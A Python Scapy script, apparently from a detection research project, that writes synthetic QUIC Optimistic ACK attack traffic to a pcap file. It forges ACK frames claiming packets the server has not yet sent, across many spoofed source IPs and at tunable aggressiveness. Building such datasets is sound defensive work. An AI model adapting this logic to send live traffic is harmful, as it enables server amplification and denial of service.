#!/usr/bin/env python3
"""
QUIC Optimistic ACK Attack Traffic Generator

Genera trafico de ataque QUIC Optimistic ACK para experimentos de deteccion.
El ataque simula clientes maliciosos que envian ACKs adelantados para
provocar amplificacion del servidor.

Caracteristicas del ataque:
1. ACKs con numeros de paquete muy por delante de lo recibido
2. Alta tasa de ACKs por IP
3. Ratio bytes_out/bytes_in desbalanceado
4. Bursts de ACKs en corto tiempo

Uso:
    python3 generate_optimistic_ack_attack.py --output attack_quic.pcap --packets 1000000

Autor: QUIC Optimistic ACK Detector Project
"""

import argparse
import random
import struct
import os
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

# QUIC Version
QUIC_VERSION_1 = 0x00000001

# QUIC Long Header Types
QUIC_INITIAL = 0x00
QUIC_HANDSHAKE = 0x02

# QUIC Frame Types
FRAME_PADDING = 0x00
FRAME_ACK = 0x02
FRAME_ACK_ECN = 0x03
FRAME_CRYPTO = 0x06
FRAME_STREAM = 0x08

def generate_connection_id(length=8):
    """Generate random QUIC Connection ID"""
    return bytes([random.randint(0, 255) for _ in range(length)])

def encode_variable_int(value):
    """Encode integer using QUIC variable-length encoding"""
    if value < 64:
        return bytes([value])
    elif value < 16384:
        return bytes([0x40 | (value >> 8), value & 0xFF])
    elif value < 1073741824:
        return bytes([0x80 | (value >> 24), (value >> 16) & 0xFF,
                     (value >> 8) & 0xFF, value & 0xFF])
    else:
        return bytes([0xC0 | (value >> 56), (value >> 48) & 0xFF,
                     (value >> 40) & 0xFF, (value >> 32) & 0xFF,
                     (value >> 24) & 0xFF, (value >> 16) & 0xFF,
                     (value >> 8) & 0xFF, value & 0xFF])

def create_quic_long_header(packet_type, version, dcid, scid, packet_number):
    """Create QUIC Long Header"""
    first_byte = 0xC0 | (packet_type << 4) | 0x03

    header = bytes([first_byte])
    header += struct.pack('>I', version)
    header += bytes([len(dcid)]) + dcid
    header += bytes([len(scid)]) + scid

    if packet_type == QUIC_INITIAL:
        header += bytes([0])

    header += struct.pack('>I', packet_number)

    return header

def create_quic_short_header(dcid, packet_number):
    """Create QUIC Short Header (1-RTT)"""
    first_byte = 0x40 | 0x03

    header = bytes([first_byte])
    header += dcid
    header += struct.pack('>I', packet_number)

    return header

def create_optimistic_ack_frame(largest_ack, ack_delay=0, first_ack_range=0, ack_ranges=None):
    """
    Create QUIC ACK frame with OPTIMISTIC (fake) acknowledgments

    The key to the attack is acknowledging packets that haven't been sent yet,
    tricking the server into thinking the path has no losses.
    """
    frame = bytes([FRAME_ACK])
    frame += encode_variable_int(largest_ack)
    frame += encode_variable_int(ack_delay)

    if ack_ranges:
        frame += encode_variable_int(len(ack_ranges))
        frame += encode_variable_int(first_ack_range)
        for gap, ack_range in ack_ranges:
            frame += encode_variable_int(gap)
            frame += encode_variable_int(ack_range)
    else:
        frame += encode_variable_int(0)
        frame += encode_variable_int(first_ack_range)

    return frame

def create_padding(length):
    """Create PADDING frames"""
    return bytes([FRAME_PADDING] * length)

def generate_optimistic_ack_attack(output_file, num_packets,
                                    src_mac, dst_mac,
                                    attack_ip_range, server_ip,
                                    num_attackers=500,
                                    ack_jump_factor=100,
                                    acks_per_packet=3):
    """
    Generate QUIC Optimistic ACK attack traffic pcap

    Args:
        output_file: Output pcap file path
        num_packets: Total number of packets to generate
        src_mac: Source MAC address
        dst_mac: Destination MAC address
        attack_ip_range: Attacker IP range (e.g., "203.0.113.0/24")
        server_ip: Server IP address
        num_attackers: Number of attacking IPs
        ack_jump_factor: How far ahead to ACK (multiplier for packet number jumps)
        acks_per_packet: Number of ACK frames per packet
    """

    print(f"Generating {num_packets:,} QUIC Optimistic ACK attack packets...")
    print(f"Output file: {output_file}")
    print(f"Attack IP range: {attack_ip_range}")
    print(f"Server IP: {server_ip}")
    print(f"Number of attackers: {num_attackers}")
    print(f"ACK jump factor: {ack_jump_factor}x")
    print(f"ACKs per packet: {acks_per_packet}")

    # Parse attack IP range
    base_ip = attack_ip_range.split('/')[0]
    ip_parts = base_ip.split('.')
    base_ip_int = (int(ip_parts[0]) << 24) | (int(ip_parts[1]) << 16) | \
                  (int(ip_parts[2]) << 8) | int(ip_parts[3])

    # Initialize attacker flows
    attackers = []
    for i in range(num_attackers):
        attacker_ip_int = base_ip_int + (i % 256)
        attacker_ip = f"{(attacker_ip_int >> 24) & 0xFF}.{(attacker_ip_int >> 16) & 0xFF}." \
                     f"{(attacker_ip_int >> 8) & 0xFF}.{attacker_ip_int & 0xFF}"

        attacker = {
            'ip': attacker_ip,
            'port': 50000 + (i % 15000),
            'dcid': generate_connection_id(8),
            'scid': generate_connection_id(8),
            'pkt_num': 0,
            'fake_server_pkt_num': 0,  # The fake packet number we claim to ACK
            'state': 'initial',
        }
        attackers.append(attacker)

    packets = []
    packets_per_update = num_packets // 10

    for i in range(num_packets):
        if i > 0 and i % packets_per_update == 0:
            print(f"  Progress: {i:,}/{num_packets:,} ({i*100//num_packets}%)")

        # Select random attacker
        attacker = random.choice(attackers)

        src_ip = attacker['ip']
        dst_ip = server_ip
        src_port = attacker['port']
        dst_port = 443

        # Create attack packet based on state
        if attacker['state'] == 'initial':
            # Start with a legitimate-looking Initial packet
            header = create_quic_long_header(QUIC_INITIAL, QUIC_VERSION_1,
                                            attacker['dcid'], attacker['scid'],
                                            attacker['pkt_num'])

            # But immediately start ACKing non-existent packets
            # This is the "optimistic" part - ACKing packets the server hasn't sent
            fake_largest_ack = attacker['fake_server_pkt_num'] + random.randint(50, 200)

            payload = create_optimistic_ack_frame(fake_largest_ack, 1, fake_largest_ack)
            payload += create_padding(1200 - len(header) - len(payload))

            attacker['pkt_num'] += 1
            attacker['fake_server_pkt_num'] = fake_largest_ack

            if attacker['pkt_num'] > 2:
                attacker['state'] = 'attack'

        elif attacker['state'] == 'attack':
            # Main attack phase - send lots of fake ACKs
            header = create_quic_short_header(attacker['dcid'], attacker['pkt_num'])

            payload = b''

            # Send multiple optimistic ACKs per packet
            for _ in range(acks_per_packet):
                # Jump AHEAD by a large amount - this is the attack!
                # Normal ACKs would be at most current_pkt_num + 1
                # We ACK packets the server "will send" in the future
                jump = random.randint(ack_jump_factor, ack_jump_factor * 10)
                attacker['fake_server_pkt_num'] += jump

                # Very small ACK delay (claiming instant receipt)
                ack_delay = random.randint(0, 5)

                # Large first ACK range (claiming we got everything)
                first_range = min(attacker['fake_server_pkt_num'], random.randint(100, 500))

                ack_frame = create_optimistic_ack_frame(
                    attacker['fake_server_pkt_num'],
                    ack_delay,
                    first_range
                )
                payload += ack_frame

            # Minimal padding
            if len(payload) < 50:
                payload += create_padding(50 - len(payload))

            attacker['pkt_num'] += 1

        # Build complete packet
        quic_payload = header + payload

        # Create Scapy packet
        pkt = Ether(src=src_mac, dst=dst_mac) / \
              IP(src=src_ip, dst=dst_ip) / \
              UDP(sport=src_port, dport=dst_port) / \
              Raw(load=quic_payload)

        packets.append(pkt)

    print(f"  Writing {len(packets):,} packets to {output_file}...")
    wrpcap(output_file, packets)

    # Calculate statistics
    file_size = os.path.getsize(output_file)
    avg_fake_pkt_num = sum(a['fake_server_pkt_num'] for a in attackers) / len(attackers)

    print(f"\n  Attack Statistics:")
    print(f"    File size: {file_size / (1024*1024):.2f} MB")
    print(f"    Avg fake pkt number: {avg_fake_pkt_num:,.0f}")
    print(f"    Total ACK frames: ~{num_packets * acks_per_packet:,}")
    print(f"Done!")

    return len(packets)


def generate_mixed_attack(output_file, num_packets,
                          src_mac, dst_mac,
                          attack_ip_range, server_ip,
                          num_attackers=500):
    """
    Generate mixed attack traffic with varying intensities

    Some flows are more aggressive than others, making detection harder.
    """

    print(f"Generating {num_packets:,} mixed QUIC Optimistic ACK attack packets...")
    print(f"Output file: {output_file}")

    # Parse attack IP range
    base_ip = attack_ip_range.split('/')[0]
    ip_parts = base_ip.split('.')
    base_ip_int = (int(ip_parts[0]) << 24) | (int(ip_parts[1]) << 16) | \
                  (int(ip_parts[2]) << 8) | int(ip_parts[3])

    # Initialize attackers with different aggressiveness levels
    attackers = []
    for i in range(num_attackers):
        attacker_ip_int = base_ip_int + (i % 256)
        attacker_ip = f"{(attacker_ip_int >> 24) & 0xFF}.{(attacker_ip_int >> 16) & 0xFF}." \
                     f"{(attacker_ip_int >> 8) & 0xFF}.{attacker_ip_int & 0xFF}"

        # Randomly assign aggressiveness
        aggressiveness = random.choice(['low', 'medium', 'high', 'extreme'])

        if aggressiveness == 'low':
            jump_factor = 10
            acks_per_pkt = 1
        elif aggressiveness == 'medium':
            jump_factor = 50
            acks_per_pkt = 2
        elif aggressiveness == 'high':
            jump_factor = 100
            acks_per_pkt = 3
        else:  # extreme
            jump_factor = 500
            acks_per_pkt = 5

        attacker = {
            'ip': attacker_ip,
            'port': 50000 + (i % 15000),
            'dcid': generate_connection_id(8),
            'scid': generate_connection_id(8),
            'pkt_num': 0,
            'fake_server_pkt_num': 0,
            'state': 'attack',
            'jump_factor': jump_factor,
            'acks_per_pkt': acks_per_pkt,
            'aggressiveness': aggressiveness,
        }
        attackers.append(attacker)

    # Count aggressiveness distribution
    agg_counts = {'low': 0, 'medium': 0, 'high': 0, 'extreme': 0}
    for a in attackers:
        agg_counts[a['aggressiveness']] += 1

    print(f"  Attacker distribution:")
    for level, count in agg_counts.items():
        print(f"    {level}: {count} ({count*100//num_attackers}%)")

    packets = []
    packets_per_update = num_packets // 10

    for i in range(num_packets):
        if i > 0 and i % packets_per_update == 0:
            print(f"  Progress: {i:,}/{num_packets:,} ({i*100//num_packets}%)")

        attacker = random.choice(attackers)

        header = create_quic_short_header(attacker['dcid'], attacker['pkt_num'])

        payload = b''
        for _ in range(attacker['acks_per_pkt']):
            jump = random.randint(attacker['jump_factor'],
                                 attacker['jump_factor'] * 5)
            attacker['fake_server_pkt_num'] += jump

            ack_frame = create_optimistic_ack_frame(
                attacker['fake_server_pkt_num'],
                random.randint(0, 10),
                min(attacker['fake_server_pkt_num'], random.randint(50, 300))
            )
            payload += ack_frame

        if len(payload) < 50:
            payload += create_padding(50 - len(payload))

        attacker['pkt_num'] += 1

        quic_payload = header + payload

        pkt = Ether(src=src_mac, dst=dst_mac) / \
              IP(src=attacker['ip'], dst=server_ip) / \
              UDP(sport=attacker['port'], dport=443) / \
              Raw(load=quic_payload)

        packets.append(pkt)

    print(f"  Writing {len(packets):,} packets to {output_file}...")
    wrpcap(output_file, packets)

    file_size = os.path.getsize(output_file)
    print(f"  File size: {file_size / (1024*1024):.2f} MB")
    print(f"Done!")

    return len(packets)


def main():
    parser = argparse.ArgumentParser(description='Generate QUIC Optimistic ACK attack traffic')
    parser.add_argument('--output', '-o', default='attack_quic_optimistic_ack_1M.pcap',
                       help='Output pcap file (default: attack_quic_optimistic_ack_1M.pcap)')
    parser.add_argument('--packets', '-n', type=int, default=1000000,
                       help='Number of packets to generate (default: 1000000)')
    parser.add_argument('--src-mac', default='00:00:00:00:00:02',
                       help='Source MAC address')
    parser.add_argument('--dst-mac', default='0c:42:a1:dd:5b:28',
                       help='Destination MAC address (monitor NIC)')
    parser.add_argument('--attack-range', default='203.0.113.0/24',
                       help='Attack IP range (default: 203.0.113.0/24)')
    parser.add_argument('--server-ip', default='10.0.0.1',
                       help='Server IP address (default: 10.0.0.1)')
    parser.add_argument('--attackers', type=int, default=500,
                       help='Number of attacking IPs (default: 500)')
    parser.add_argument('--jump-factor', type=int, default=100,
                       help='ACK jump factor (default: 100)')
    parser.add_argument('--acks-per-packet', type=int, default=3,
                       help='Number of ACK frames per packet (default: 3)')
    parser.add_argument('--mixed', action='store_true',
                       help='Generate mixed attack with varying intensities')

    args = parser.parse_args()

    if args.mixed:
        generate_mixed_attack(
            args.output,
            args.packets,
            args.src_mac,
            args.dst_mac,
            args.attack_range,
            args.server_ip,
            args.attackers
        )
    else:
        generate_optimistic_ack_attack(
            args.output,
            args.packets,
            args.src_mac,
            args.dst_mac,
            args.attack_range,
            args.server_ip,
            args.attackers,
            args.jump_factor,
            args.acks_per_packet
        )


if __name__ == '__main__':
    main()
